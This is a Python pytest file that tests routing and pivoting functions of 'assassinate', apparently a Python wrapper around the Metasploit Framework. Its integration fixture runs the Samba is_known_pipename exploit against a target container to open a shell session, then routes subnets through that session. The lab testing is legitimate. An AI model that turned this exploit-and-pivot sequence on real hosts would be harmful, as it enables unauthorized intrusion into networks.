"""Test routing/pivoting functions (Tier 4).

Basic tests run without a session.
Integration tests require INTEGRATION_TESTS=true and a target container.
"""

import os
import pytest
import assassinate


@pytest.fixture(scope="module")
def framework():
    """Initialize MSF framework once for the test module."""
    msf_root = os.environ.get("MSF_ROOT", os.path.expanduser("~/Projects/metasploit-framework"))
    if not assassinate.is_initialized():
        assassinate.init_msf(msf_root)
    yield


class TestRouteBasic:
    """Basic routing tests that don't require a session."""

    def test_route_list_empty(self, framework):
        """route_list() returns empty list when no routes exist."""
        # Flush first to ensure clean state
        assassinate.route_flush()
        routes = assassinate.route_list()
        assert isinstance(routes, list)
        assert len(routes) == 0

    def test_route_flush(self, framework):
        """route_flush() works even when routing table is empty."""
        # Should not raise
        assassinate.route_flush()
        routes = assassinate.route_list()
        assert len(routes) == 0

    def test_route_exists_nonexistent(self, framework):
        """route_exists() returns False for non-existent route."""
        assassinate.route_flush()
        exists = assassinate.route_exists("10.10.10.0", "255.255.255.0")
        assert exists is False

    def test_route_get_no_route(self, framework):
        """route_get() returns None when no route exists for address."""
        assassinate.route_flush()
        result = assassinate.route_get("10.10.10.50")
        assert result is None


@pytest.mark.skipif(
    os.environ.get("INTEGRATION_TESTS", "").lower() != "true",
    reason="Integration tests disabled (set INTEGRATION_TESTS=true)"
)
class TestRouteIntegration:
    """Integration tests requiring a live session."""

    @pytest.fixture(scope="class")
    def session(self, framework):
        """Get a session by exploiting the target container."""
        target_host = os.environ.get("TARGET_HOST", "172.19.0.2")

        # Get sessions before exploit
        sessions_before = set(assassinate.list_sessions())

        # Run exploit
        exploit = assassinate.create_module("exploit/linux/samba/is_known_pipename")
        exploit.options.RHOSTS = target_host
        exploit.options.SMB_SHARE_NAME = "myshare"
        exploit.exploit("cmd/unix/interact", timeout=30)

        # Poll for new session (may take a moment)
        import time
        session_id = None
        for _ in range(30):
            time.sleep(1)
            sessions_now = set(assassinate.list_sessions())
            new_sessions = sessions_now - sessions_before
            if new_sessions:
                session_id = new_sessions.pop()
                break

        if session_id is None:
            pytest.skip("Could not obtain session - is target-linux running?")

        yield session_id

        # Cleanup
        assassinate.kill_session(session_id)

    def test_route_add_remove(self, framework, session):
        """Add and remove a route through a session."""
        # Ensure clean state
        assassinate.route_flush()

        # Add route
        added = assassinate.route_add("10.10.10.0", "255.255.255.0", session)
        assert added is True

        # Verify it exists
        exists = assassinate.route_exists("10.10.10.0", "255.255.255.0")
        assert exists is True

        # List routes
        routes = assassinate.route_list()
        assert len(routes) == 1
        route = routes[0]
        assert route["subnet"] == "10.10.10.0"
        assert route["netmask"] == "255.255.255.0"
        assert route["session_id"] == session

        # Remove route
        removed = assassinate.route_remove("10.10.10.0", "255.255.255.0", session)
        assert removed is True

        # Verify removed
        exists = assassinate.route_exists("10.10.10.0", "255.255.255.0")
        assert exists is False

    def test_route_get_with_route(self, framework, session):
        """route_get() returns session ID for routed address."""
        assassinate.route_flush()

        # Add route
        assassinate.route_add("10.10.10.0", "255.255.255.0", session)

        # Check best route
        best = assassinate.route_get("10.10.10.50")
        assert best == session

        # Cleanup
        assassinate.route_flush()

    def test_multiple_routes(self, framework, session):
        """Can add multiple routes through same session."""
        assassinate.route_flush()

        # Add two routes
        assassinate.route_add("10.10.10.0", "255.255.255.0", session)
        assassinate.route_add("192.168.100.0", "255.255.255.0", session)

        routes = assassinate.route_list()
        assert len(routes) == 2

        # Verify both work
        best1 = assassinate.route_get("10.10.10.50")
        best2 = assassinate.route_get("192.168.100.50")
        assert best1 == session
        assert best2 == session

        # Cleanup
        assassinate.route_flush()
